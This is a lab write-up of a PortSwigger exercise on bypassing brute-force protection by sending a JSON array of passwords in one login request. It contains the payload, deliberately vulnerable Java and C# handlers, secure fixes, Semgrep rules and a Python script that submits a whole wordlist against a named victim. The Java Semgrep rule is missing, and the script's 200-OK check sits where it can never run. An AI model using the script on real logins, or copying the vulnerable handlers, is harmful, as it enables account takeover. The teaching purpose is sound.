---
title: "Lab 06: Broken brute-force protection, multiple credentials per request"
date: 2025-12-19
categories: [portswigger, authentication] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-19-lab05_authentication/
---

## 1. Executive Summary

**Vulnerability:** Broken Brute-Force Protection (JSON Array Injection).

**Description:** The application accepts authentication credentials via JSON. While it likely implements rate limiting based on the number of *HTTP requests*, it fails to validate the data type of the `password` field. By submitting an *array* of passwords instead of a single string, an attacker can test dozens or hundreds of passwords in a single HTTP request, effectively bypassing request-based rate limits.

**Impact:** Massive brute-force efficiency. An attacker can test an entire dictionary of passwords in one go, completely sidestepping standard IP blocking or lockout mechanisms.

## 2. The Attack

**Objective:** Brute-force `carlos`'s password by sending the entire password list in a single payload.

1. **Reconnaissance:** I intercepted the login request. I noticed the `Content-Type` was `application/json` and the body structure was:JSON
    
    ```bash
    {
        "username": "carlos",
        "password": "123"
    }
    ```
    
2. **Hypothesis:** If the backend parser uses a loop to check input, or if the library automatically creates a list from an array, I might be able to send multiple passwords at once.
3. **Exploitation:**
    - I modified the JSON in Burp Repeater. I changed the `password` field from a string to a JSON Array `[...]`.
    - I pasted the entire contents of the candidate password list into this array.
    - **Payload:**JSON
        
        ```bash
        {
            "username": "carlos",
            "password": [
                "123456",
                "password",
                "12345678",
                "..."
            ]
        }
        ```
        
4. **Result:** The server processed the request and returned a `302 Found`.
5. **Access:** The backend found *one* correct password in that list and logged me in. I used "Show response in browser" to assume the session.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The flaw is often in how flexible JSON libraries (like Jackson in Java or Newtonsoft in C#) bind data to objects, combined with developer logic that iterates blindly.

- **The Flaw:** The code accepts a `List<String>` or `Object` for the password field, instead of strictly enforcing a single `String`.
- **The Logic:** The backend iterates through the provided input. If *any* of the strings match the real password, it sets the user as authenticated.

### Java (Spring Boot)

```java
@PostMapping(value = "/login", consumes = "application/json")
// VULNERABLE: Using Object or untyped Map allowing polymorphic deserialization
public ResponseEntity<?> login(@RequestBody Map<String, Object> credentials) {
    
    String username = (String) credentials.get("username");
    Object passwordInput = credentials.get("password");

    User user = userRepository.findByUsername(username);
    
    // FLAW: Logic to handle both single password AND list of passwords
    if (passwordInput instanceof List) {
        List<String> attempts = (List<String>) passwordInput;
        for (String pwd : attempts) {
            if (passwordEncoder.matches(pwd, user.getPassword())) {
                 return ResponseEntity.ok(createToken(user));
            }
        }
    } else {
        // Normal check
        if (passwordEncoder.matches((String)passwordInput, user.getPassword())) {
             return ResponseEntity.ok(createToken(user));
        }
    }
    
    return ResponseEntity.status(401).build();
}
```

**Technical Flow & Syntax Explanation:**

- **`@RequestBody Map<String, Object>`**: By using `Object`, the developer allows the JSON parser to deserialize `password` as a `String` OR an `ArrayList`.
- **`instanceof List`**: The code explicitly accommodates the array format, looping through every entry. This effectively moves the brute-force attack from the network layer (detectable) to the CPU layer (harder to detect).

### C# (ASP.NET Core)

```csharp
[HttpPost("login")]
public IActionResult Login([FromBody] JObject data)
{
    // VULNERABLE: JObject allows dynamic types
    var username = data["username"].ToString();
    var passwordToken = data["password"];

    var user = _db.Users.Single(u => u.Username == username);

    // FLAW: Iterating if the token is an array
    if (passwordToken.Type == JTokenType.Array)
    {
        foreach (var pwd in passwordToken)
        {
            if (Verify(pwd.ToString(), user.Hash)) 
                return Ok(new { token = "..." });
        }
    }
    else 
    {
        if (Verify(passwordToken.ToString(), user.Hash)) 
            return Ok(new { token = "..." });
    }

    return Unauthorized();
}
```

**Technical Flow & Syntax Explanation:**

- **`JObject` / `JTokenType.Array`**: Using untyped JSON objects allows the client to dictate the data structure.
- **Looping**: The `foreach` loop processes every attempt within a single request context, bypassing any middleware that counts "1 Request = 1 Login Attempt".

### Mock PR Comment

The login endpoint accepts a JSON array for the `password` field and iterates through all supplied values to check for a match. This allows attackers to test thousands of passwords in a single HTTP request, bypassing our rate limiting.

**Recommendation:** Strictly enforce that the `password` field must be a single `String`. If the JSON parser encounters an array, it should throw a deserialization error (400 Bad Request).

## 4. The Fix

**Explanation of the Fix:**
We must define a **Strict DTO (Data Transfer Object)**. The `password` field in the class definition must be of type `String`. If the client sends an array `[...]`, the JSON parser will fail to map it to the String field and throw an exception immediately.

### Secure Java

```java
// SECURE: Strict DTO Class
public class LoginRequest {
    private String username;
    // This forces the parser to expect a String only.
    // An array [ "a", "b" ] will cause a JsonMappingException.
    private String password;
    
    // getters/setters
}

@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest loginRequest) {
    // We only check ONE password per request.
    if (authService.check(loginRequest.getUsername(), loginRequest.getPassword())) {
        return ResponseEntity.ok().build();
    }
    return ResponseEntity.status(401).build();
}
```

**Technical Flow & Syntax Explanation:**

- **`private String password`**: Strong typing prevents type confusion.
- **Framework Defense**: Spring Boot's Jackson library handles the validation automatically. An array input effectively crashes the request parsing before it reaches the business logic.

### Secure C#

```csharp
// SECURE: Strong Typing
public class LoginDto
{
    public string Username { get; set; }
    public string Password { get; set; } // Only accepts a string literal
}

[HttpPost("login")]
public IActionResult Login([FromBody] LoginDto model)
{
    // The framework validates the JSON structure before this line.
    // Logic only runs once.
    if (_auth.Validate(model.Username, model.Password))
    {
        return Ok();
    }
    return Unauthorized();
}
```

## 5. Automation

*A Python script that reads a password list, formats it into a JSON array, and sends the "Batch Attack".*

```python
#!/usr/bin/env python3
import argparse
import requests
import json
import sys

def exploit_json_bypass(url, username, password_file):
    login_url = f"{url.rstrip('/')}/login"

    print(f"[*] Targeting: {login_url}")
    print(f"[*] Victim: {username}")

    with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords.")

    payload = {
    "username": username,
    "password": passwords
    }

    headers = {"Content-Type": "application/json"}

    print("[*] Sending batch request...")
    
    try:
        # Don't allow redirects so we can see the 302 Found
        resp = requests.post(login_url, json=payload, headers=headers, allow_redirects=False)
        
        print(f"[*] Status Code: {resp.status_code}")

        # check for success

        if resp.status_code == 302:
            print("[!!!] SUCCESS: The server accepted one of the passwords in the list!")
            # Note: We don't know WHICH one exactly, but we are logged in.
            if "session" in resp.cookies:
                print(f"[+] Session Cookie: {resp.cookies.get('session')}")
            elif resp.status_code == 200 and "error" not in resp.text.lower():
             # Sometimes success is 200 OK with a token
             print("[?] Possible success (200 OK). Check response body.")
        else:
            print("[-] Attack failed. Server might have rejected the array format.")
            
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("victim", help="Victim username")
    ap.add_argument("wordlist", help="Password list")
    args = ap.parse_args()

    exploit_json_bypass(args.url, args.victim, args.wordlist)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules look for code that manually inspects the type of a password field to see if it's a List/Array.*

### Java Rule

**Technical Flow & Syntax Explanation:**

- **`instanceof List`**: This is the smoking gun. There is almost never a legitimate reason to accept a list of passwords for a single login attempt.

### C# Rule

```yaml
rules:
  - id: csharp-json-password-array-check
    languages: [csharp]
    message: "Detected logic handling JSON Array for password field. Potential brute-force bypass."
    severity: WARNING
    patterns:
      - pattern: |
          if ($TOKEN.Type == JTokenType.Array) { ... }
```

**Technical Flow & Syntax Explanation:**

- **`JTokenType.Array`**: Specific to Newtonsoft.Json (Json.NET). Flags manual type checking that enables the vulnerability.
